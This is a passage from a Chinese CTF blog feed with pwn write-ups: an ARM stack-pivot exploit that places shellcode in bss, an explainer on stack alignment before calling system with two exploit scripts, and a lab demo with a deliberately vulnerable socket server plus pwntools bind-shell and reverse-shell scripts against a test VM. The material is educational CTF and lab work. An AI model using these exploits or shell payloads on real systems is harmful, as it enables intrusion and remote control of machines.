class="line">payload2+=p64(<span class="number">0</span>)+p64(bss_addr)<span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x21 x22</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x23 x24</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="inctf2018-wARMup"><a href="#inctf2018-wARMup" class="headerlink" title="inctf2018_wARMup"></a>inctf2018_wARMup</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><p>通过这道题的学习与收获有：</p>
<p>1、arm架构（32位）的bss段是可执行的！</p>
<p>2、这道题考察的是栈迁移，以及通过调试来确定payload的布局。这道题是比较锻炼调试能力的（至少对于现在的我来说），锻炼调试能力，我指的是不看exp的情况下，自己做这道题…</p>
<p>3、现在也做了三道arm架构的题了，说实话和x86下的区别不大。只要熟悉x86的做题思路，做这种题，应该很快就能适应。</p>
<h2 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811528.png"></p>
<h2 id="程序分析：-1"><a href="#程序分析：-1" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811529.png"></p>
<p>存在溢出点，但是可溢出的字节很少，因此考虑栈迁移。且没有后门函数</p>
<p><strong>这道题我有的地方写的是R11（是因为IDA上看是R11），有的地方写的fp（因为gdb里看的是fp)，实际上这俩就是一个东西。</strong></p>
<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p>栈迁移的话，考虑迁移到BSS段，同时观察汇编，发现read的第二个参数（即输入的地址）是由R3传递的，而R3的值是由R11来传递的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811530.png"></p>
<p>同时在最后，又有一个pop指令来控制R11和PC，因此我们是可以控制R11（也就是read的第二个参数)和程序执行流的（PC）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811531.png"></p>
<p>经过调试发现，这个fp距离我们输入起始的地址偏移为100,这就意味着我们需要填充100个垃圾数据，然后来控制fp以及pc。</p>
<p>因此第一次输入的时候，控制fp，让其为bss段地址（迁移的时候bss段尽量抬高），然后将返回地址read地址，再跑一次，让我们的第二次payload输入到bss段。</p>
<p><strong>arm架构（32位）的bss段是可执行的，尽管用vmmap看的是可写不可执行（但是布置进去的shellcode确实可以执行）</strong></p>
<p>因此我们就要把shellcode布置在bss段。这道题是十分锻炼自主的调试能力的，可以看见我的exp是在shellcode前面布置了两个内容，这里我并不想解释原因。最开始我自己做这道题的时候并没有写这两个内容，当时我认为直接把bss段写shellcode就行，然后控制PC指针执行过去，<strong>事实上这样做是错误的</strong>。原因请自主调试，这里考察了自主调试来布局payload（如果你可以眼睛看出来payload整体布局的话，当我什么都没说），如果连这里到最后都不理解而且还稀里糊涂的交了flag的话，那做这道题是毫无意义的。</p>
<p>大致思路就是这样（第二次输入布置shellcode，然后控制PC寄存器，将其指向shellcode的位置）剩下的具体细节真的没有办法记录，因为剩下的布局都是一点一点调试出来的。</p>
<h2 id="关于对调试能力的总结："><a href="#关于对调试能力的总结：" class="headerlink" title="关于对调试能力的总结："></a>关于对调试能力的总结：</h2><p>我这里说一下我从刚开始学pwn，到现在也刚好是四个月了。总结了一下的调试经验（有可能在各位师傅面前算是班门弄斧了，但这依然是对这四个月所掌握的调试能力的一个记录）。</p>
<p>第一，你要时刻清楚你自己想要看的内容以及自己卡在了哪里</p>
<p>第二，在调试的过程中，遇到卡住的地方，要思考为什么会这样。</p>
<p>第三，在锻炼调试能力的时候，刚开始有的地方可能不知道卡住的原因是什么，建议找一份可以打通（和你思路相近的）的exp，去调试一下，再反复对比自己exp的动态调试，这样很容易找到问题。</p>
<p>第四，就是可能你认为你的思路很对，但就是打不通，而别人的思路都和你的不一样，<strong>由衷建议，不要放弃你的思路，到最后无非是两种可能，你通过坚持以及思考打通了自己的exp，又或者是你通过反复调试，最后发现自己的思路是错误的，不可行的。但其实不论结果，这个坚持的过程已经让你的调试能力有了不小的进步。</strong></p>
<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26705)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;./armup_buu&quot;])</span></span><br><span class="line">p=process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./armup_buu&quot;</span>])</span><br><span class="line">e=ELF(<span class="string">&#x27;./armup_buu&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x21000</span>+<span class="number">0x600</span></span><br><span class="line">read_addr=<span class="number">0x0001052C</span></span><br><span class="line">offset=<span class="number">100</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">payload=offset*<span class="string">&#x27;a&#x27;</span>+p32(bss_addr+<span class="number">0x68</span>)+p32(read_addr)<span class="comment">#因为sub减去了0x68，所以这里提前加上0x68</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">shellcode=p32(<span class="number">0</span>)+p32(bss_addr+<span class="number">8</span>)+asm(shellcraft.sh())</span><br><span class="line">payload=shellcode</span><br><span class="line">payload=payload.ljust(<span class="number">0x64</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)+p32(<span class="number">0x10548</span>)<span class="comment">#bss_addr+4是将sp设置成bss_addr（不过这一步只是将参数给R11，将sp赋值是下面的操作）    将pc设置为0x10548的目的是再执行一遍 SUB     SP, R11     POP     &#123;R11,PC&#125;</span></span><br><span class="line"><span class="comment">#这样来修改sp的值，如果不修改sp的值的话，执行shellcode的时候，有个指令会将栈里（此时是bss段）的值修改，从而导致shellcode执行失败。</span></span><br><span class="line"><span class="comment">#上述的内容用一句话说就是，要将栈迁移到执行流的地方。不然shellcode会把自身给破坏了... 要是不相信的话，可以不要这两个指令，然后调试一下，就明白咋回事了</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>ARM架构</tag>
      </tags>
  </entry>
  <entry>
    <title>关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</title>
    <url>/posts/75ba47d9.html</url>
    <content><![CDATA[<p>有时候在做64位题目的时候会发现exp也能执行到 system(“&#x2F;bin&#x2F;sh”)，但就是获取不了shell。然后通过gdb调试发现是在最后的system函数执行到内部的时候卡住了，然后就满脸疑惑，这也能卡？？？</p>
<span id="more"></span>

<h2 id="为什么执行system函数要栈对齐"><a href="#为什么执行system函数要栈对齐" class="headerlink" title="为什么执行system函数要栈对齐"></a>为什么执行system函数要栈对齐</h2><p>其实啊，<strong>64位ubuntu18以上系统调用system函数时是需要栈对齐的</strong>。再<strong>具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐</strong>，如果你到system函数执行的时候，si单步进去就会发现，如果没对齐的话，最后就会卡在这里（如下图）。<br><img src="/../img/2706180-20220629161534055-1971449802.png"></p>
<h2 id="对齐？怎么才算对齐？"><a href="#对齐？怎么才算对齐？" class="headerlink" title="对齐？怎么才算对齐？"></a>对齐？怎么才算对齐？</h2><p>因为64位程序的地址是8字节的，而十六进制又是满16就会进位，因此我们看到的栈地址末尾要么是0要么是8。如下图</p>
<p><img src="/../img/2706180-20220312122451427-1700171694.png"></p>
<p>只有当地址的末尾是0的时候，才算是与16字节对齐了，如果末尾是8的话，那就是没有对齐。而我们想要在ubuntu18以上的64位程序中执行system函数，必须要在执行system地址末尾是0。</p>
<p>下面两个图，分别是没对齐和对齐的情况。</p>
<p><img src="/../img/2706180-20220312122500759-1557162145.png"></p>
<p><img src="/../img/2706180-20220312122510505-529221181.png"></p>
<h2 id="如果执行system的时候没有对齐怎么办？"><a href="#如果执行system的时候没有对齐怎么办？" class="headerlink" title="如果执行system的时候没有对齐怎么办？"></a>如果执行system的时候没有对齐怎么办？</h2><p>如果<strong>执行了一个对栈地址的操作指令</strong>（比如pop,ret,push等等，但如果是mov这样的则不算对栈的操作指令），那么<strong>栈地址就会+8或是-8</strong>。<strong>为使rsp对齐16字节，核心思想就是增加或减少栈内容，使rsp地址能相应的增加或减少8字节，这样就能够对齐16字节了。因为栈中地址都是以0或8结尾，0已经对齐16字节，因此只需要进行奇数次pop或push操作，就能把地址是8结尾的rsp变为0结尾，使其16字节对齐。</strong></p>
<p>这时候有两种解决方法。</p>
<p>1、去将system函数地址+1，<strong>此处的+1，即是把地址+1，也可以理解为</strong></p>
<p><strong>+1是为了跳过一条栈操作指令（我们的目的就是跳过一条栈操作指令，使rsp十六字节对齐</strong>，<strong>跳过一条指令，自然就是把8变成0了</strong>）。但又一个问题就是，本来+1是为了跳过一条栈操作指令，但是你也不知道下一条指令是不是栈操作指令，如果不是栈操作指令的话（你加一之后有可能正好是mov这种指令，也有可能人家指令是好几个字节，你加一之后也没有到下一个指令呢），+1也是徒劳的，要么就继续+1，一直加到遇见一条栈操作指令为止（看别的师傅说最大加16次就能成功，不过我不知道为啥）</p>
<p><img src="/../img/2706180-20220312122522900-1221918873.png"></p>
<p><strong>可以看见本来我们应该是用401186这个地址的，但是我们现在要跳过一条指令，那自然就是用401187，这样就跳过了push rbp这条指令。</strong></p>
<p>2、直接在调用system函数地址之前去调用一个ret指令。因为本来现在是没有对齐的，那我现在直接执行一条对栈操作指令（ret指令等同于pop rip，该指令使得rsp+8，从而完成rsp16字节对齐），这样system地址所在的栈地址就是0结尾，从而完成了栈对齐。</p>
<p>因此payload有两种改法（下面我是以BUUCTF上的rip题目的exp为例）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28002</span>)</span><br><span class="line">payload=<span class="number">23</span>*<span class="string">&#x27;A&#x27;</span>+p64(<span class="number">0x401186</span>+<span class="number">1</span>)+p64(<span class="number">0</span>)<span class="comment">#加1去跳过一个栈操作指令，使其对齐16字节</span></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;please input&quot;)#这里用recvuntil会报连接超时，因为nc上去发现服务器那边的程序上没有打印这句话</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28002</span>)</span><br><span class="line">payload=<span class="number">23</span>*<span class="string">&#x27;A&#x27;</span>+p64(<span class="number">0x401016</span>)+p64(<span class="number">0x401186</span>)+p64(<span class="number">0</span>)<span class="comment">#0x401016是一个ret指令， p64(0)是system函数的返回地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>探究</category>
      </categories>
      <tags>
        <tag>栈对齐</tag>
      </tags>
  </entry>
  <entry>
    <title>一次简单的远程Getshell（在目标机上开启一个shell）</title>
    <url>/posts/729cf436.html</url>
    <content><![CDATA[<h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><p>从第一次接触pwn的到现在将近四个月了，每次做出来pwn题之后，把写好的脚本打到服务器上，就可以在服务器那边开启一个shell，然后用cat就可以读出我们需要的flag了。可是事实上我们真的可以用pwn的解题手法去进行一次攻击么？我们最后在对方主机去执行system(‘&#x2F;bin&#x2F;sh’)真的可以拿到shell么？</p>
<span id="more"></span>

<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>接下来的实验环境：</p>
<p>攻击者的机器是Ubuntu   ip:192.168.43.150</p>
<p>目标机是kali     	 ip:192.168.43.71</p>
<h2 id="对疑惑做一个简单的回答"><a href="#对疑惑做一个简单的回答" class="headerlink" title="对疑惑做一个简单的回答"></a>对疑惑做一个简单的回答</h2><h3 id="先回答第一个问题（我们真的可以用pwn的解题手法去进行一次攻击么？）。"><a href="#先回答第一个问题（我们真的可以用pwn的解题手法去进行一次攻击么？）。" class="headerlink" title="先回答第一个问题（我们真的可以用pwn的解题手法去进行一次攻击么？）。"></a>先回答第一个问题（我们真的可以用pwn的解题手法去进行一次攻击么？）。</h3><p>可以的，因为接下来，我就演示一下利用与解pwn相同的思路完成一次最最最简单入侵（甚至简单到还需要目标机的配合），就是在目标机上运行一个有漏洞的程序，然后攻击者发送给目标机一个脚本，然后在攻击者的主机上开启一个shell，用来控制目标机</p>
<h3 id="再回答第二个问题（我们最后在对方主机去执行system-‘-x2F-bin-x2F-sh’-真的可以拿到shell么？）。"><a href="#再回答第二个问题（我们最后在对方主机去执行system-‘-x2F-bin-x2F-sh’-真的可以拿到shell么？）。" class="headerlink" title="再回答第二个问题（我们最后在对方主机去执行system(‘&#x2F;bin&#x2F;sh’)真的可以拿到shell么？）。"></a>再回答第二个问题（我们最后在对方主机去执行system(‘&#x2F;bin&#x2F;sh’)真的可以拿到shell么？）。</h3><p>不可以的，如果仅仅是平常我们做题的脚本，发到了运行着漏洞程序的目标机上，执行了system(‘&#x2F;bin&#x2F;sh’)，仅仅是在目标机上开了一个shell，这个shell与攻击者的主机是没有任何关系的（如下图）</p>
<p><img src="/../img/2706180-20220311170438374-343305220.png"></p>
<p>可以看到kali上确实开启了一个新的shell，但是这个shell跟攻击者是没关系的，可以看下ubuntu这边的情况（发现是没有任何回显的）。</p>
<p><img src="/../img/2706180-20220311170452032-529076340.png"></p>
<h2 id="进攻的思路以及准备"><a href="#进攻的思路以及准备" class="headerlink" title="进攻的思路以及准备"></a>进攻的思路以及准备</h2><h3 id="首先第一点，就是怎么找到目标机？"><a href="#首先第一点，就是怎么找到目标机？" class="headerlink" title="首先第一点，就是怎么找到目标机？"></a>首先第一点，就是怎么找到目标机？</h3><p>对方也仅仅是个主机，它并不会像服务器那样暴露在公网上，而攻击者的主机和目标机就如同黑暗森林中带枪的猎人，无法直接被找到，而想要找到它，就需要不断的去接近它，最终猎人们彼此处于了同一片森林（也就是攻击者与目标机处于了同一个网段）。此时猎人试着用nmap工具扫描了一下，然后就发现了另一个猎人的ip（这个192.168.43.1是网关（gateway)）。</p>
<p><img src="/../img/2706180-20220311170506140-1776303059.png"></p>
<p>猎人抱着试试看的心态，去扫描了一下这个ip。</p>
<p><img src="/../img/2706180-20220311170524403-609189311.png"></p>
<p>发现了开放8888这个端口，而这个端口运行了一个无NX无canary且有溢出的程序（至于猎人怎么知道运行的是这个漏洞程序，这里不做讨论，毕竟这篇文章的目的是演示下最简单的进攻流程，而实际的环境中要比这个流程复杂很多）。</p>
<p>漏洞程序的源码如下（这里我用的是这位师傅的源码<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/%EF%BC%89%EF%BC%9A">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/）：</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span>  s,c,j  =  <span class="number">0xe4ff</span>;<span class="comment">//留下的这个0xe4ff对应的小端序机器码就是jmp rsp,这样溢出到返回地址直接填写这个地址，就可以执行下面的shellcode了（就不需要再泄露地址了）</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span> </span><br><span class="line">  server.sin_family      = AF_INET;<span class="comment">//使用IPv4地址</span></span><br><span class="line">  server.sin_addr.s_addr = INADDR_ANY;<span class="comment">//INADDR_ANY为本机的IP</span></span><br><span class="line">  server.sin_port        = htons(<span class="number">8888</span>);<span class="comment">//开放的端口</span></span><br><span class="line"></span><br><span class="line">  s = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);<span class="comment">//第一个参数表示使用IPv4地址，第二个参数是表示套接字类型为面向连接的套接字，第三个参数为使用TCP传输协议</span></span><br><span class="line">      bind  (s,(<span class="keyword">struct</span> sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server));</span><br><span class="line">      listen(s,<span class="number">10</span>);</span><br><span class="line">  c = accept(s,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">      read  (c,buf,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>采用gcc test.c -fno-stack-protector -z execstack -no-pie -o test  #这里关闭了canary和NX保护</p>
<p><img src="/../img/2706180-20220311170534186-1125823830.png"></p>
<p><img src="/../img/2706180-20220311170542067-511506874.png"></p>
<p>用IDA看一下，得到了溢出的偏移（0x16+8)。</p>
<p>由于没有开启NX，我们使用shellcode。如果只是正常开启shell的shellcode的话，那就是本文最开始第二个问题所出现的情况（就是确实是开启了一个shell，但是开在了目标机上，跟攻击者没有任何关系）</p>
<p>因此这里我们就要换一种shellcode。在这之前还要学习一下正连与反连。</p>
<h2 id="正连（正向shell）"><a href="#正连（正向shell）" class="headerlink" title="正连（正向shell）"></a>正连（正向shell）</h2><p>我大概说一下正连的原理。我们现在有一个<strong>shellcode</strong>，他的功能是<strong>在目标机上开启一个shell</strong>（现在看来功能和寻常获取shell的shellcode没什么区别），不过紧接着<strong>这个shellcode还会将刚刚开启的这个shell 的输入、输出绑定到我们指定的端口上（这个端口是在目标机上的）</strong>。然后<strong>我们继续利用pwntools去连接这个新开的端口，这样我们就获得了一个可以与目标机产生交互的shell（因为我们远程连接了目标机一个端口上的shell嘛）</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.43.71&quot;</span>,<span class="number">8888</span>)</span><br><span class="line">sc = asm(shellcraft.bindsh(<span class="number">4444</span>))<span class="comment">#这个意思就是开启一个shell，把这个shell绑定到4444端口</span></span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">30</span>+p64(<span class="number">0x400669</span>)+sc)<span class="comment">#这个偏移是30，但是好像不同的机器编译源码之后，这个偏移可能不一样。然后这个0x400669是jmp rsp的位置，这个不同电脑的这个指令位置也是不同的，还是要自己用ROPgadget搜一下吧。</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;192.168.43.71&quot;</span>,<span class="number">4444</span>)<span class="comment">#然后再次连接到刚刚开启的shell上</span></span><br><span class="line">sh.interactive()<span class="comment">#这个交互是与sh交互，而不是与io交互</span></span><br></pre></td></tr></table></figure>

<p>因为kali是以root权限运行的漏洞程序，因此用脚本开启的shell就直接是root权限，还可以创建和删除文件。</p>
<p><img src="/../img/2706180-20220311170554118-208807962.png"></p>
<p><img src="/../img/2706180-20220311170602137-1122006877.png"></p>
<p>可以看到如果是以root权限开启shell的话，威力还是非常大的。也就是说被攻击者用什么权限运行的漏洞程序，攻击者远程获取的shell就是什么权限。</p>
<h2 id="反连（反向shell）"><a href="#反连（反向shell）" class="headerlink" title="反连（反向shell）"></a>反连（反向shell）</h2><p>关于反弹shell可以阅读下面两篇文章</p>
<p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p>
<p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
<p>利用这个反连的话，我们<strong>需要先监听本机的一个端口</strong>（你可以把这个监听理解成打开），然后也是利用一段shellcode，<strong>这个shellcode会实现反弹shell</strong>，<strong>将shell反弹到我在本机开的端口上去。然后用pwntools中的wait_for_connection函数等待着反连</strong>。等到反连成功后，即可在攻击者的窗口开启一个与目标机交互的shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = listen(<span class="number">4444</span>)<span class="comment">#在本机监听4444端口</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.43.71&quot;</span>,<span class="number">8888</span>)<span class="comment">#远程连接到目标机</span></span><br><span class="line">shellcode = asm(shellcraft.connect(<span class="string">&#x27;192.168.43.150&#x27;</span>,<span class="number">4444</span>)+shellcraft.dupsh())<span class="comment">#让目标机连接到我们本机开放的端口</span></span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">30</span>+p64(<span class="number">0x400669</span>)+shellcode)</span><br><span class="line"></span><br><span class="line">sh.wait_for_connection()</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这次kali使用了普通用户来运行漏洞程序，可以看见这次攻击者就没有办法去创建或是删除文件了。</p>
<p><img src="/../img/2706180-20220311170613647-976763824.png"></p>
<p><img src="/../img/2706180-20220311170621593-1348201456.png"></p>
<p>总结一下正向shell和反向shell。<strong>在实际的攻击当中，正向shell是攻击者连接被攻击者的机器，可以用于攻击者身处内网，被攻击者身处外网的情况；而反向shell则是被攻击者主动连接攻击者，可以用于攻击者处于外网，被攻击者处于内网的情况</strong>。 </p>
<p>其实本次攻击到此也就结束了，我们分别用正连和反连的方法获取了目标机的shell。但往往很多东西看着简单，但做的难。实际操作的时候就会遇见各种各样稀奇古怪的问题，也会绕许多弯路。</p>
<h2 id="在完成实验时所碰到的问题"><a href="#在完成实验时所碰到的问题" class="headerlink" title="在完成实验时所碰到的问题"></a>在完成实验时所碰到的问题</h2><h3 id="1、同步网段问题"><a href="#1、同步网段问题" class="headerlink" title="1、同步网段问题"></a>1、同步网段问题</h3><p>首先是将两个虚拟机部署在同一个网段的问题，正常情况下，只需要让虚拟机开桥接模式即可。</p>
<p><img src="/../img/2706180-20220311170629421-1313264995.png"></p>
<p><strong>这是正常情况下，开启桥接模式之后，虚拟机就会和主机在同一个网段下面</strong>，只要让两台主机去连一个相同的热点，这样ubuntu和kali就可以处于在一个网段上了。但天有不测风云，我的电脑开启桥接之后，虚拟机和主机并不在一个网段上。</p>
<p>我采用的解决方法是让VMnet0桥接到物理网卡上。</p>
<p><img src="/../img/2706180-20220311170636696-617709141.png"></p>
<p>然后在网络适配器这里改成自定义，去连接VMnet0。<strong>（因为我当时不知道咋搞的，把虚拟网卡弄没了一个，用这个方法的话，可以让自己的两个虚拟机都桥接到一个物理网卡上面）</strong><br><img src="/../img/2706180-20220311170644194-2024796383.png"></p>
<p>最后两个虚拟机都处于了同一网段。</p>
<h3 id="2、socat工具绑定端口出现的问题"><a href="#2、socat工具绑定端口出现的问题" class="headerlink" title="2、socat工具绑定端口出现的问题"></a>2、socat工具绑定端口出现的问题</h3><p>最开始的时候，我写了一个只有漏洞的程序（没有开启端口这部分），然后我是用socat工具去绑定的。绑定的也很成功。然后就去写脚本打，可是不管怎么打脚本，最后得到的都是EOF</p>
<p><img src="/../img/2706180-20220311170650236-893387920.png"></p>
<p>请教了roderick师傅之后，得出来的结论是<strong>socat不知道因为什么原因，等到shellcode执行之后，关闭了socket。因此这里的端口与进程绑定不能用socat工具来绑定了</strong>，就采用了<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/%E8%BF%99%E4%B8%AA%E5%B8%88%E5%82%85%E5%8D%9A%E5%AE%A2%E4%B8%8A%E7%9A%84%E6%B6%89%E5%8F%8A%E6%80%9D%E8%B7%AF%EF%BC%8C%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%B8%8A%EF%BC%8C%E5%8A%A0%E4%B8%80%E6%AE%B5%E5%B0%86%E8%87%AA%E8%BA%AB%E7%BB%91%E5%AE%9A%E7%BB%99%E7%AB%AF%E5%8F%A3%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E8%BF%99%E6%A0%B7%E8%BF%90%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E4%B9%8B%E5%90%8E%E8%87%AA%E5%B7%B1%E5%B0%B1%E4%B8%8E%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%AF%E5%8F%A3%E7%BB%91%E5%AE%9A%E4%BA%86%E3%80%82">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/这个师傅博客上的涉及思路，在漏洞程序源码上，加一段将自身绑定给端口的代码。这样运行漏洞程序之后自己就与指定的端口绑定了。</a></p>
<p>感悟：一次非常非常简单的攻击<strong>（简单到有的地方甚至还需要被攻击者的配合，真正的情况中，攻击者怎么才能知道被攻击者开放的端口里正好运行了漏洞程序，而攻击者又恰好有一个脚本？这些在本文章都没有探究或者说目前以我的水平也没法去想这些。但是不影响在我们建立假设的前提下去进行一些实验和思考）</strong>，在实验的过程中碰到了很多小问题，有的是卡了一会，有的则是卡了一天，如同上面第二个那个问题，描述它很简单，只用了两句话，但是发现这个问题所在却是用了一天多的时间。看别人操作总是感觉很简单，包括自己的所认为的思路也想的很简单，有时候我们认为不可能出现问题的地方，却恰恰是卡了我们很久的地方。<strong>因此在平常的做题以及学习的过程中，还是要多去思考，多去问，多去实践，才能更快的进步。</strong></p>
<p>最后本文还要感谢 <a href="https://roderickchan.github.io/">roderick师傅</a> 以及我的两位同学（<a href="https://www.timochan.cn/">提莫酱</a> 和 <a href="https://www.cnblogs.com/LQ-Joker">joker</a>），如果没有他们的帮助，也许我还会绕很多弯路。</p>
<p>参考文章：</p>
<p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/</a></p>
<p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p>
<p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
]]></content>
      <categories>
        <category>探究</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>关于ret2_dl_runtime_resolve的学习总结</title>
    <url>/posts/ba418f23.html</url>
    <content><![CDATA[<h1 id="延迟绑定整体流程图"><a href="#延迟绑定整体流程图" class="headerlink" title="延迟绑定整体流程图"></a>延迟绑定整体流程图</h1><p>下面主要解释_dl_runtime_resolve这个函数运作时的情况，而延迟绑定的整体流程就不详细说明了，具体的流程可以参考下面这个流程图（这个我也忘记是哪个师傅做的了，很久之前收藏了这个图片）</p>
<p><img src="/../img/2706180-20220228094538432-2125281617.png"></p>
<p>而Linux中最终完成动态链接的函数进行重定位的是在_dl_runtime_resolve(link_map_obj, reloc_index)函数中完成的，如果再详细一点就是_dl_runtime_reslove函数调用了_dl_fixup函数，然后_dl_fixup函数调用了_dl_lookup_symbol_x函数，最终这个函数去动态库里面找到了我们此刻进行延迟绑定的函数，并且把它的地址填写到了got.plt表项中。这里主要详细讲一下_dl_runtime_resolve函数的运作流程</p>
<span id="more"></span>

<h1 id="dl-runtime-reslove函数的运作流程"><a href="#dl-runtime-reslove函数的运作流程" class="headerlink" title="_dl_runtime_reslove函数的运作流程"></a>_dl_runtime_reslove函数的运作流程</h1><p>这个函数运行的大致流程如下，<strong>流程不理解也没关系，先结合着我写的流程跟着一起做就可以了</strong>，做完之后肯定就会有点思路了，这时候就可以进行一些思考了。<strong>下面这三个段</strong>，我建议先大概看一下，<strong>不用彻底弄懂</strong>，然后开始跟着我的流程分析，<strong>等遇到这个段的时候，再拐回来看，效果会比较好。</strong></p>
